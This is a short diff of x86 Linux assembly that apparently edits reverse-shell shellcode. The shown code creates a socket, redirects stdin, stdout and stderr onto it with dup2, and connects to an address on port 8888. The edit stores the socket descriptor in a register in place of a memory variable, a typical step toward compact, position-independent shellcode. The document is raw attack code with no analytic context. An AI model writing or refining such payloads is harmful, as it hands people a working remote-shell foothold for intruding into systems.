@@ -44,26 +44,26 @@ _start:
 	mov cl, 1
 	xor edx, edx
 	int 0x80
-	mov dword [socket], eax
+	mov dword esi, eax
 
 
 	;dup2 - 0
 	xor eax, eax
 	mov al, 0x3f
-	mov ebx, [socket]
+	mov ebx, esi
 	xor ecx, ecx
 	int 0x80
 	;dup2 - 1
 	xor eax, eax
 	mov al, 0x3f
-	mov ebx, [socket]
+	mov ebx, esi
 	xor ecx, ecx
 	mov cl, 1
 	int 0x80
 	;dup2 - 2
 	xor eax, eax
 	mov al, 0x3f
-	mov ebx, [socket]
+	mov ebx, esi
 	xor ecx, ecx
 	mov cl, 2
 	int 0x80
@@ -72,7 +72,7 @@ _start:
 	;Connect - 362
 	xor eax, eax
 	mov ax, 0x16a
-	mov ebx, [socket]
+	mov ebx, esi
 	xor edi, edi
 	push dword edi 		; push 0 => ip 0.0.0.0
     push edi			; port 8888, big endian
